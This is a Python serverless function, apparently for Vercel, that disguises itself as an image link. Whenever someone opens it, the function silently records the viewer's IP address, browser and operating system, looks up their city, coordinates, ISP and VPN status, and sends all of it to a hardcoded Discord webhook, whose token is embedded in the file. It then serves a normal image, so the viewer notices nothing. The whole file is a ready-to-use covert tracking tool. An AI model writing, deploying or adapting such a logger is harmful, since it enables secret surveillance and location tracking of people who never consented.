from http.server import BaseHTTPRequestHandler
import requests
import json
import base64
from urllib import parse
import httpagentparser
from datetime import datetime

# Your Discord webhook URL - Replace this with your own
WEBHOOK_URL = "https://discord.com/api/webhooks/1335367124763541575/13qiIWSrldwpHiemSCBYcOSNjIiBySOyndtrqLRYObAnj-mAHL9jMKZvDO6QhkugtMFl"

# Your default image URL - Replace this with any image you want
DEFAULT_IMAGE = "https://placekitten.com/800/600"

def get_transparent_pixel():
    """Return a 1x1 transparent GIF"""
    return base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")

def get_ip_info(ip):
    """Get information about an IP address"""
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
        return response.json()
    except:
        return {"status": "fail", "query": ip}

def log_to_discord(ip_info, user_agent, path):
    """Send the IP information to Discord webhook"""
    # Get browser and OS info
    os_name, browser = httpagentparser.simple_detect(user_agent)
    
    # Create the Discord message
    embed = {
        "username": "Image Logger",
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image View Detected",
                "color": 0x00FFFF,
                "description": f"""**Someone viewed your image!**

**Path:** `{path}`
                
**IP Info:**
> **IP:** `{ip_info.get('query', 'Unknown')}`
> **Provider:** `{ip_info.get('isp', 'Unknown')}`
> **Country:** `{ip_info.get('country', 'Unknown')}`
> **Region:** `{ip_info.get('regionName', 'Unknown')}`
> **City:** `{ip_info.get('city', 'Unknown')}`
> **Coordinates:** `{str(ip_info.get('lat', '?'))+', '+str(ip_info.get('lon', '?'))}`
> **VPN/Proxy:** `{ip_info.get('proxy', False)}`

**Device Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**
```
{user_agent}
```""",
                "timestamp": datetime.utcnow().isoformat()
            }
        ]
    }
    
    # Send to webhook
    try:
        requests.post(WEBHOOK_URL, json=embed, timeout=5)
    except Exception as e:
        print(f"Failed to send webhook: {str(e)}")

def handle_request(event):
    """Handle the serverless request"""
    # Get the path and query parameters
    path = event.get('path', '/')
    query_params = {}
    
    if 'query' in event:
        query_params = event['query']
    
    # Get the client IP and user agent
    headers = event.get('headers', {})
    ip = headers.get('x-forwarded-for', '').split(',')[0].strip()
    user_agent = headers.get('user-agent', '')
    
    # Get the image URL from parameters or use default
    image_url = DEFAULT_IMAGE
    if 'url' in query_params:
        try:
            image_url = base64.b64decode(query_params['url'].encode()).decode()
        except:
            pass
    elif 'image' in query_params:
        image_url = query_params['image']
    
    # Log the view to Discord
    ip_info = get_ip_info(ip)
    log_to_discord(ip_info, user_agent, path)
    
    try:
        # Try to get the actual image
        response = requests.get(image_url, timeout=10)
        if response.status_code == 200:
            # Return the image
            return {
                'statusCode': 200,
                'headers': {
                    'Content-Type': response.headers.get('Content-Type', 'image/jpeg'),
                },
                'body': base64.b64encode(response.content).decode('utf-8'),
                'isBase64Encoded': True
            }
    except:
        pass
    
    # If we can't get the image, return a transparent pixel
    return {
        'statusCode': 200,
        'headers': {
            'Content-Type': 'image/gif',
        },
        'body': base64.b64encode(get_transparent_pixel()).decode('utf-8'),
        'isBase64Encoded': True
    }

def handler(event, context):
    """Vercel serverless function handler"""
    return handle_request(event)
